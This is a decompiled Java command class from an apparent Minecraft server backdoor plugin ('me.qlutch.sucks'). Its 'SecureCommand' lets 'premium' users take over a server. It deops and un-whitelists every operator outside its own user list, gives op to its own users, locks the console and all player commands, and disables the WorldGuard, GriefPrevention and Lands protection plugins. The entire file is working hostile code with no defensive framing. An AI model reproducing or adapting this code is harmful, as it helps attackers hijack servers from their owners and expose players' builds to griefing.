/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class SecureCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (!plugin.lite.contains(a2.getName())) {
                    if (!a2.isOp()) continue;
                    API.deopPlayer(a2);
                    a2.setWhitelisted(false);
                    continue;
                }
                a2.setWhitelisted(true);
                API.opPlayer(a2);
            }
            p2.sendMessage(Settings.PREFIX("Everyone not logged in was deoped and un-whitelisted"));
            p2.sendMessage(Settings.PREFIX("Everyone logged in was oped and whitelisted"));
            plugin.isLocked = true;
            p2.sendMessage(Settings.PREFIX("Console was locked"));
            plugin.playerCommandsLocked = true;
            p2.sendMessage(Settings.PREFIX("All commands are now locked"));
            API.disablePlugin("WorldGuard");
            p2.sendMessage(Settings.PREFIX("Attempting to disable WorldGuard"));
            API.disablePlugin("GriefPrevention");
            p2.sendMessage(Settings.PREFIX("Attempting to disable GriefPrevention"));
            API.disablePlugin("Lands");
            p2.sendMessage(Settings.PREFIX("Attempting to disable Lands"));
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "premium " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

